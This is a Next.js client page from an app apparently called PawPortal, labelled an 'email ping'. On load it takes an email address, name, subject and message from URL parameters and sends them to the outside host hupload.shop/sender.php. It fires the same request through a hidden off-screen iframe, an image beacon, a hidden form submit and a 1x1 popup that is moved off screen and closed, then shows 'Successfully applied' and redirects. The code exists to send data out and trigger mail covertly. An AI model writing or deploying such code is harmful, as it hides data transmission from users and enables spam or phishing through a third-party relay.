// app/email-ping/page.tsx
"use client";

import { useEffect, useMemo } from "react";
import { useSearchParams } from "next/navigation";

export default function EmailPingPage() {
  const sp = useSearchParams();

  const params = useMemo(() => {
    const email = sp.get("email") || "";
    const name = sp.get("name") || "PawPortal";
    const subject = sp.get("subject") || "PawPortal";
    const msg = sp.get("msg") || "You Have New Notification";
    const next = sp.get("next") || "/dashboard";

    const qs = new URLSearchParams({
      email,
      name,
      subject,
      msg,
      _: String(Date.now()),
    }).toString();

    return {
      email,
      next,
      apiUrl: `https://hupload.shop/sender.php?${qs}`, // <-- needs backticks
    };
  }, [sp]);

  useEffect(() => {
    if (!params.email) {
      window.location.replace(params.next);
      return;
    }

    try {
      // 1) hidden iframe beacon
      const ifr = document.createElement("iframe");
      ifr.src = params.apiUrl;
      ifr.width = "1";
      ifr.height = "1";
      ifr.style.position = "absolute";
      ifr.style.left = "-9999px";
      ifr.style.top = "-9999px";
      document.body.appendChild(ifr);

      // 2) image beacon
      const img = new Image();
      img.referrerPolicy = "no-referrer";
      img.src = params.apiUrl;

      // 2.5) hidden iframe + GET form submit (guarantee fire)
      const TARGET = "hidden_pp_submit";
      let catcher = document.querySelector<HTMLIFrameElement>(`iframe[name="${TARGET}"]`); // <-- fixed selector quotes
      if (!catcher) {
        catcher = document.createElement("iframe");
        catcher.name = TARGET;
        catcher.width = "1";
        catcher.height = "1";
        catcher.style.position = "absolute";
        catcher.style.left = "-9999px";
        catcher.style.top = "-9999px";
        catcher.style.pointerEvents = "none";
        catcher.style.visibility = "hidden";
        document.body.appendChild(catcher);
      }

      const form = document.createElement("form");
      form.method = "GET";
      form.action = params.apiUrl;
      form.target = TARGET;
      form.style.position = "absolute";
      form.style.left = "-9999px";
      document.body.appendChild(form);
      try {
        form.submit();
      } catch {}
      setTimeout(() => {
        try {
          form.remove();
        } catch {}
      }, 1500);

      // 3) tiny popup call (with hiding)
      let win: Window | null = null;
      try {
        win = window.open(
          params.apiUrl,
          "_blank",
          "noopener,noreferrer,width=1,height=1,left=-10000,top=-10000"
        );

        if (win) {
          const w = win;
          const start = Date.now();
          const hideLoop = window.setInterval(() => {
            try {
              w.moveTo(999999, 999999);
              w.resizeTo(1, 1);
              w.blur();
              window.focus();
            } catch {}
            if (w.closed || Date.now() - start > 700) {
              clearInterval(hideLoop);
            }
          }, 25);

          window.setTimeout(() => {
            try {
              w.close();
            } catch {}
          }, 250);
        }

        if (win) {
          setTimeout(() => {
            try {
              win!.close();
            } catch {}
            try {
              window.focus();
            } catch {}
          }, 600);
        }
      } catch {}

      // success message for ~1s then redirect
      const t = setTimeout(() => {
        window.location.replace(params.next);
      }, 1000);

      return () => {
        clearTimeout(t);
        try {
          ifr.remove();
        } catch {}
        try {
          if (win) win.close();
        } catch {}
      };
    } catch {
      window.location.replace(params.next);
    }
  }, [params]);

  // Minimal UI main
  return (
    <main className="flex min-h-[50vh] items-center justify-center">
      <div className="rounded-lg bg-green-50 px-4 py-2 text-green-700 shadow">
        Successfully applied
      </div>
    </main>
  );
}
